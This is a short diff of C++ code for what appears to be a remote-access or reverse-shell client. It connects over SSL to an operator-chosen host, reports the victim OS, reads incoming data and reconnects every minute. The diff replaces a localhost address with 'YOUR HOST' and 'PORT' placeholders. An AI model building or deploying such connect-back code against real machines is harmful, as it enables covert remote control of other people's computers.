@@ -31,10 +31,10 @@ int main(){
 		if(Cli->Connect(argv[1], argv[2])){
 			std::cout<<"Connected!!!\n";
 		#else
-		if(Cli->Connect("127.0.0.1", "31337")){
+		if(Cli->Connect("YOUR HOST", "PORT")){
 		#endif
 			TryAgain:
-			iBytes = SSL_write(Cli->sslSocket, "00", 2); //01 linux 00 windows
+			iBytes = SSL_write(Cli->sslSocket, "00", 2);
 			if(iBytes > 0){ 
 				while(1){
 					iBytes = SSL_read(Cli->sslSocket, cBuffer, 1023);
@@ -65,7 +65,7 @@ int main(){
 			#ifdef _DEBUG
 			Sleep(3000);
 			#else
-			Sleep(60000);                  
+			Sleep(60000);
 			#endif
 		}
 	}
